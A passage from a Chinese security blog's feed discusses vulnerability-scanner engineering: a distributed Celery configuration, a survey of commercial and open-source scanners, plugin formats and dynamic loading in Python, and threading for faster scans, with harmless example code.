&amp;gt;&amp;gt;&amp;gt; app.control.ping(timeout=0.5)

[{'worker1.example.com': 'pong'},
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;查看时区差异:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from celery.utils.timeutils import utcoffset
&amp;gt;&amp;gt;&amp;gt; utcoffset()

0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;库版本不同步等原因，可能造成worker和server的时间不同步。而且时间不同步，似乎会导致celery的超时机制不可用。&lt;/p&gt;

&lt;p&gt;我们可以安装ntp服务，自动更新时间，同步server和worker的指定python库版本，示例命令如下【每个系统情况不一定适用】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install ntp
service ntp start
#手动更新时间
date -R

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;监控woker状态的一些点，可以参考这篇文章：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://fangchichen.github.io/fangchichen.github.io/2018/08/08/celery%E5%87%BA%E7%8E%B0worker%E5%BC%82%E5%B8%B8offline%E6%83%85%E5%86%B5/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery关键配置&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还是那句话，各系统情况不同，
这里仅仅贴出几个关键点,大家觉得可以优化的地方可以讨论下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#任务预取功能，就是每个工作的进程／线程在获取任务的时候，会尽量多拿 n 个，以保证获取的通讯成本可以压缩。
CELERYD_PREFETCH_MULTIPLIER = 1

#这个表示每个工作的进程／线程 在执行 n 次任务后，主动销毁，之后会起一个新的，主要解决一些资源释放的问题。
CELERYD_MAX_TASKS_PER_CHILD = 1

#不存取返回结果，加快响应速度。
CELERY_IGNORE_RESULT=False

#该配置可以保证task不丢失，中断的task在下次启动时将会重新执行。
TASK_REJECT_ON_WORKER_LOST = True
#不会多拿任务，只有当worker完成了这个task时，任务才被标记为ack状态。
#只有当worker完成了这个task时，任务才被标记为ack状态
CELERY_ACKS_LATE = True

#解决时区同步问题
CELERY_TIMEZONE = 'Asia/Shanghai'
CELERY_ENABLE_UTC = True
USE_TZ = True

#broker的连接超时时间。
BROKER_CONNECTION_TIMEOUT = 20

#如果确认是因为当前worker的并发是prefork（多进程）,并且可能是由于死锁原因造成，4.0之后的版本不支持。
CELERYD_FORCE = True

#任务超时会分配给其他worker
BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 3600}

#禁用所有速度限制，如果网络资源有限，不建议开足马力。
#CELERY_DISABLE_RATE_LIMITS = True
#CELERY_ACKS_LATE = True
#CELERY_IGNORE_RESULT = True

#这个表示保存任务结果的时长，这个时间会被设置到 backend 里面
#CELERY_TASK_RESULT_EXPIRES = 3600

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery命令行参数&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Queue还是建议启用的，方便清空，也方便指定queuename运行特定任务。
比如配置文件里这么写:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CELERY_QUEUES = (
            Queue('default', Exchange('default'), routing_key='default'),
            Queue('wakaka', Exchange('wakaka'), routing_key='wakaka'),
            )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;那么，命令行可以这么输入：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;celery -A test worker -E -l INFO -n workername -Q wakaka --concurrency=4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意，–concurrency的值是并发进程数，这是由你的CPU个数决定性能的，不要设太高。&lt;/p&gt;

&lt;p&gt;win下的话，在高版本celery 4.x，默认的是prefork，报错解决方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install eventlet
celery -A proj worker -l info -P eventlet

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后，建议大家不要在win下运行celery，似乎4.x以后某个版本已经放弃支持，而且win下有很多坑没法填。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;任务调度框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于任务调度这一块儿，除了celery，感觉dramatiq和rq的坑会少些，以后会抽空来谈谈。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</summary></entry><entry><title type="html">漫谈漏洞扫描</title><link href="/scanner/2018/12/27/talk-about-scanner-roads/" rel="alternate" type="text/html" title="漫谈漏洞扫描" /><published>2018-12-27T16:42:38+08:00</published><updated>2018-12-27T16:42:38+08:00</updated><id>/scanner/2018/12/27/talk-about-scanner-roads</id><content type="html" xml:base="/scanner/2018/12/27/talk-about-scanner-roads/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;企业级漏扫&quot;&gt;企业级漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;盒子扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于漏扫产品的话，部分甲方单位会按公安那边的标准，在内网部署一些盒子扫描器（硬件服务器+扫描软件）。&lt;/p&gt;

&lt;p&gt;说实话，这玩意儿定位是比较尴尬的，虽然大的单位每年有一定的采购指标。但是有时候还是会听产品经理吐槽，每次实在卖不出量，可能一单安全服务生意卖出个一两台就不错了。&lt;/p&gt;

&lt;p&gt;当然，现在漏扫一般会配合漏洞管理、网站监控等产品一起卖。为了覆（tong）盖（hang）产（jing）品（zheng）线，给售前和销售操控的空间，这款产品还是必须要的。&lt;/p&gt;

&lt;p&gt;卖漏扫盒子的利润还算可观，只要销售和渠道给力，传统乙方还是愿意做的这门生意的。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sangfor
venus
nsfocus
topsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;在线漏扫服务&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在线漏扫的话，一般难以对内网进行检测。大多数的操作是，在验证外网某站的所有权后，再签协议授权扫描。不过由于成本较盒子更加低廉，容易受到中小厂商的追捧。&lt;/p&gt;

&lt;p&gt;当然，如果内网也需要享受这样的服务的话，自然还是需要安服人员带着盒子，或者类似封装好的扫描器，在企业单位进行驻场检测。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;360
knownsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;定制漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;据笔者所知，部分云服务厂商，会对云服务客户提供了定制漏扫服务。&lt;/p&gt;

&lt;p&gt;由于是自家的服务器，自然对客户的业务具有一定的了解。无论是做漏扫，还是做资产监控还是态势感知，都是相对容易的。&lt;/p&gt;

&lt;p&gt;云服务厂商在对这部分客户做漏扫时，由于统一的架构部署，安服漏扫会比较精确和有效。貌似这样的漏扫服务，一般不会对外开放，算是定制的服务。&lt;/p&gt;

&lt;p&gt;顺便提一句，部分漏洞平台，好像对于大客户也推出了一条龙服务，其中是包括定制漏扫的。&lt;/p&gt;

&lt;p&gt;代表云厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alibaba
tencent
kingsoft
riskivy
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;免费商业漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;市面上也出现了部分优秀的商业级别漏扫，咱们这里先别讨论是免费版还是破解版。&lt;/p&gt;

&lt;p&gt;正是有了这些漏扫产品，在驻场和分公司的苦逼兼职的安服人员，才有了一口饭吃【纯吐槽公司制度】。&lt;/p&gt;

&lt;p&gt;这里解释下，因为公司内部的漏扫产品，不是分驻地都能拿到授权的，那最后怎么办呢？用破解的。效果不好咋办？换其他家的破解或者免费产品。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AWVS
nessus
arachni
metasploit
sqlmap
burpsuite
appscan
netsparker
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开源漏扫&quot;&gt;开源漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;社区级漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些产品一般是社区或者团队在维护的，一般为乙方渗透人员或者Bug Bounty人员所用。&lt;/p&gt;

&lt;p&gt;一旦他们需要对企业机构，或者政府单位进行渗透测试时，可以根据情况，部署分布式节点扫描，加快漏扫速度。&lt;/p&gt;

&lt;p&gt;笔者依稀记得曾经的bugscan，好像大家都可以接入公网节点。这听起来，其实有点像以前的迅雷p2p，可以加速所有运行的任务。&lt;/p&gt;

&lt;p&gt;不过后来好像由于各种原因，部分人搞到了源码和payload包，自己玩起了单机。多台外网VPS一部署，扫起东西来也是美滋滋，亲测出结果还是比较快的。&lt;/p&gt;

&lt;p&gt;不过这种漏扫有个坏处就是，一旦社区不用心再维护，渐渐就没有人再提交payload，毕竟单个漏洞的生命周期还是不长的。&lt;/p&gt;

&lt;p&gt;当然，这种产品还有个去路，就是实现企业化。&lt;/p&gt;

&lt;p&gt;一旦变成企业级产品，就会有更多的资源投入去维护它，自然能更好的发展下去。&lt;/p&gt;

&lt;p&gt;比较可惜的是，升级后的版本以及payload，自然大多数就不会再开源了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bugscan
蚁逅
tangscan
Beebeeto
Pocscan
Osprey「鱼鹰」
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;综合扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于各种脚本语言的兴起，大幅减少了coding的难度和时间，网络上涌现出一批由团队或个人维护的综合扫描器。&lt;/p&gt;

&lt;p&gt;虽然得吐槽下，大多数质量良莠不齐，造轮子的比较多，而且后续长期作者维护的比较少，不过其中不乏优秀的个体。&lt;/p&gt;

&lt;p&gt;综合扫描定义比较模糊，一般除了exp检测和CMS识别外，还有部分项目加入了路径爆破、资产统计、端口扫描等功能。&lt;/p&gt;

&lt;p&gt;不过让人稍稍有点失望的是，这类综合扫描可能大同小异，暂时没有发现特别亮眼的点。&lt;/p&gt;

&lt;p&gt;在笔者过往的系列文章中，也谈过部分关于综合扫描器细节，这里不再细说。&lt;/p&gt;

&lt;p&gt;代表产品有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;w9scan
AngelSword
fenghuangscanner
猪猪侠PPT中提过的扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Gui扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里之所以单独区别于前面的综合扫描器【其实是笔者实在想不出小标题了XD】，是想谈谈其开发时间、开发难度，以及插件化难度。&lt;/p&gt;

&lt;p&gt;虽然说部分Gui扫描器也实现了插件化，但作者们大多喜欢自己更新，或者只要求邮件方式提交插件。&lt;/p&gt;

&lt;p&gt;这样的话，把产品生态搞成了一个近似闭环，但是肯定又远不及apple store之类的体量，导致用户主动提交的漏扫插件是比较少的。&lt;/p&gt;

&lt;p&gt;当然，有部分漏扫的功能和用户体验，还是做的很不错的，很受大家追捧，笔者当年也用的很顺手。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;椰树
北极熊扫描器
k8 team系列扫描器
千手千眼佛网站扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;代理扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说起代理扫描器，可能内容就比较宽泛了，这里简单讲下，以后有机会单独谈谈。&lt;/p&gt;

&lt;p&gt;何谓代理，中间人也，只要你能抓住中间流量，便可以作为基准去做漏洞扫描或者fuzz。&lt;/p&gt;

&lt;p&gt;大家可能会想到利用抓包，利用网卡流量进行分析；有人也许会通过浏览器流量代理进行分析；还有人会通过浏览器本身提供扩展插件功能，直接对页面进行即时钩子探测。&lt;/p&gt;

&lt;p&gt;说到这块儿，笔者所见的一般都是轻量级的，也可能是见识少吧。个人感觉很少有在采集存数据库以后，在离线端部署过多的exp探测任务的。&lt;/p&gt;

&lt;p&gt;毕竟，这块儿也是要考虑到扫描效率，以及会话过期问题的。&lt;/p&gt;

&lt;p&gt;另外，貌似代理扫描器对owasp的一些通用漏洞的fuzz，以及对敏感内容的检测，会显得多一些。对于能检测逻辑漏洞的被动扫描器，也算是比较高level的了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysrc的GourdScan
burpsuite插件系列
wyproxy的衍生扫描器
浏览器插件系列
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。&lt;/p&gt;

&lt;p&gt;可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</summary></entry><entry><title type="html">浅谈漏扫之插件篇</title><link href="/scanner/2018/10/08/scanner-plugins/" rel="alternate" type="text/html" title="浅谈漏扫之插件篇" /><published>2018-10-08T12:37:38+08:00</published><updated>2018-10-08T12:37:38+08:00</updated><id>/scanner/2018/10/08/scanner-plugins</id><content type="html" xml:base="/scanner/2018/10/08/scanner-plugins/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，我们将简单谈谈插件相关的内容。下面的示例代码依旧沿用python，但求行文精炼不赘言。&lt;/p&gt;

&lt;h3 id=&quot;插件的格式&quot;&gt;插件的格式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;入口函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def run():
    print 'I am the bone of my sword'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;运行这类插件时，加载插件的入口函数run，就可以直接运行插件。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;类 + 入口函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BaseVerify:

    def __init__(self, url):
        self.url = url
    
    def run(self):
        print 'I am the bone of my sword'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;对于这种插件，在我们获取到漏洞库文件路径后，需要对服务类型进行匹配，最后再进行插件调用。
此后，我们会获得BaseVerify类的实例，再引用里面的入口函数。&lt;/p&gt;

&lt;p&gt;调用方式：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;test = BaseVerify('http://www.baidu.com')
test.run()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;入口函数 + 验证函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def assign(service, arg):
    if service != &quot;wordpress&quot;:
        return
    else:
        r = urlparse.urlparse(arg)
        return True, r.netloc
        
def audit(arg):
    print 'I am the bone of my sword'
        
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里也可以在类中引入函数，不过此处关键点在于，同时也使用了验证函数。&lt;/p&gt;

&lt;p&gt;这样做的好处在于，即使不做插件目录分类，也能进行精准扫描，不至于在验证漏洞时处耗时过多。&lt;/p&gt;

&lt;p&gt;不过顺便提一句，即使只运行了验证service类型的代码，在加载大量插件的情况下，也是会消耗一定的资源的。&lt;/p&gt;

&lt;p&gt;调用方式(仅做参考)：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;try:
    audit( assign('www', 'http://www.baidu.com')[1] )
except:
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;关于插件注释&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在每个文件中，建议通过类属性或者直接头部注释，对每个插件进行细节标识。
不然的话，他人在复现和修改的时候，很难对代码量较大的内容进行阅读调整。当然，对于某些故意加密的插件，那就另当别论了。&lt;/p&gt;

&lt;h3 id=&quot;插件的加载&quot;&gt;插件的加载&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;__import__&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;plugin_path = 'plugin_dir.plugin_name'
try:
    plugin = __import__(plugin_path, fromlist=[plugin_path])
    test = getattr(plugin,'audit')
    test('http://www.baidu.com')
except Exception,e:
    print e

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里在获取某个插件的路径后，可转换为__import__可识别的路径格式，然后再对其入口函数audit进行引用。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;importlib&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
from importlib import import_module
plugin_path = 'plugin_dir.plugin_name'
split_dot = plugin_path.rindex('.')
module, name = plugin_path[:split_dot], plugin_path[split_dot+1:]
mod = import_module(module)
try:
    test = getattr(mod, name)
    test.audit('http://www.baidu.com')
except:
    pass

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;注意，这里的plugin_path如果不含’.’的话，可用：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from importlib import import_module
plugin_path = 'plugin_name'
test = import_module(plugin_path)
test.audit('http://www.baidu.com')

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;import&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
sys.path.append('plugin_dir/')
#加入系统路径plugin_dir
import plugin_name
plugin_name.audit('http://www.baidu.com')
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;imp&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import imp
#这里需要正常路径名
test = imp.load_source('audit', 'plugin_dir/plugin_name.py')
test.audit('http://www.baidu.com')

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;导入细节的讨论&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;笔者还见过某框架，除了导入必要的核心库文件以外，还把所有分类插件里的验证、运行等函数，也在主文件头部一股脑导入的。&lt;/p&gt;

&lt;p&gt;也就是说，在每次运行框架之前，就算只是-v看版本，也会预载入所有内容。&lt;/p&gt;

&lt;p&gt;而在某些框架脚本，在每次运行前会自动下载一个巨大的封装库（作者diy的），而不是把它放在requirement文件里。&lt;/p&gt;

&lt;p&gt;也不是说这样一定不好，不过个人窃以为，如果想要尽可能优化框架的效率，还是不太推荐大家这么做。&lt;/p&gt;

&lt;h3 id=&quot;插件的存储&quot;&gt;插件的存储&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;临时加载&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在插件不算多的时候，我们是可以这么做的，也不会太影响效率。
比如metasploit就可以选择是否启用postgresql数据库。
如果插件都放在一个目录下，进行文件遍历即可，大概可以这样写：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln_dir = 'plugin_dir/*'
vuln_paths = [f.replace('/','.') for f in glob.glob(vuln_dir)]
for vuln_path in vuln_paths:
    #vuln_path == 'plugin_dir.plugin_name'
    #下面省略
    ...
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;离线插件入库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外还有不少框架，是直接用数据库或者json文件存储了插件相关信息。在我们需要的时候，再查询导入储存的插件路径，进而对相应的插件进行调用。&lt;/p&gt;

&lt;p&gt;当然，这样需要我们每次手动或调用update脚本，去现更新这些库。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在线核验下发&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要再自动化一点，我们可以参考下bugscan、antoor、tangscan等社区级别的漏洞利用框架，对于插件下发的法子。&lt;/p&gt;

&lt;p&gt;在贡献者上传poc，并填写好相关验证信息后，后台会有工作人员或者自动化脚本，检测该poc是否合乎官方规定的语法格式。
如果没有发现问题，脚本会生成基础信息然后入库，待做好加密打码等工作后【非必要步骤】，再供离线的框架或者框架client节点爬取更新【如有出入，当我扯淡】。&lt;/p&gt;

&lt;h3 id=&quot;结果的聚合&quot;&gt;结果的聚合&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;分级过滤&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一般在汇总数据报告时，可能会出现有的确认是漏洞，有的却是存在的敏感URL。&lt;/p&gt;

&lt;p&gt;混在一起存储也不是不行，不过更好的法子是通过分级，使用单独的函数上报master，最后再进行分储和输出。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;混合存储&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在整合网上搜集来的插件时，由于各结果的返回格式不是很好统一，有的整合型框架为了兼容会直接简单处理下，就糅合在一起存储和输出了。
其实这也没啥，只要入库的时候，将特殊字符等问题处理好，做好插件漏洞的信息粗放分类标注，那就基本OK了。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;单体输出&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;某些作者单独开发的框架，是直接省略了存储这一环节的，或者是提供了选项，默认不开启的。
这时候，插件验证如果成功，会直接把信息反馈输出到命令行里。如果在验证单体漏洞或者单个目标的时候，这样做还是比较有效率的。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</summary></entry><entry><title type="html">浅谈漏扫之加速篇</title><link href="/scanner/2018/09/03/scanner-faster/" rel="alternate" type="text/html" title="浅谈漏扫之加速篇" /><published>2018-09-03T12:48:18+08:00</published><updated>2018-09-03T12:48:18+08:00</updated><id>/scanner/2018/09/03/scanner-faster</id><content type="html" xml:base="/scanner/2018/09/03/scanner-faster/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;为了方便描述，笔者这里会拿python的库来举例，部分代码采集自网络。本文会向大家简要评析一些能加快扫描速率的库。希望借此帮大家规避掉一些坑，很多点也是具有普适性的。&lt;/p&gt;

&lt;h3 id=&quot;线程&quot;&gt;线程&lt;/h3&gt;

&lt;h4 id=&quot;多线程&quot;&gt;多线程&lt;/h4&gt;

&lt;p&gt;示例：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;threading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用法比较简单，普通速成小脚本建议用这个库，比如在扫描主机存活或者探测URL路径是否存在的时候。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding:utf-8
import threading
import time

def action(arg):
    time.sleep(1)
    print  'sub thread start!the thread name is:%s    ' % threading.currentThread().getName()
    print 'the arg is:%s   ' %arg
    time.sleep(1)


for i in xrange(4):
    t =threading.Thread(target=action,args=(i,))
    t.setDaemon(True)
    t.start()
    t.join()

print 'main_thread end!'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;thread&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有的朋友可能会问，有没有更简单的，老夫不懂那么多，只想一把梭！
当然有，很早以前笔者也曾喜欢使用这个库：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding=gbk
import thread, time, random
count = 0
def threadTest():
    global count
    for i in xrange(10000):
        count += 1
for i in range(10):
    thread.start_new_thread(threadTest, ())	
time.sleep(3)
print count	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;不过thread.start_new_thread有个比较明显的缺点，因为起了新线程是不好控制的，一旦任务挂起过多，会占用较多的机器资源，所以建议在检测目标量不大的时候使用。&lt;/p&gt;

&lt;h4 id=&quot;线程池&quot;&gt;线程池&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;threadpool&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说实在这库还是比较好用的，在无序输出结果等情况下比较稳健，尤其是它在win平台下兼容性是比较好的。
不过需要注意，就是如果不加锁的话，需要先做数据聚合。直接按序写入文件，或者直接入库的话，数据会乱掉。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import time
import threadpool  
def sayhello(str):
    print &quot;Hello &quot;,str
    time.sleep(2)

name_list =['xiaozi','aa','bb','cc']
start_time = time.time()
pool = threadpool.ThreadPool(10) 
requests = threadpool.makeRequests(sayhello, name_list) 
[pool.putRequest(req) for req in requests] 
pool.wait() 
print '%d second'% (time.time()-start_time)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;concurrent.futures&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;该库是python 3.x自带的，但python 2.x也能用，相对来说会比threadpool更优化的多一些，毕竟新库嘛。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

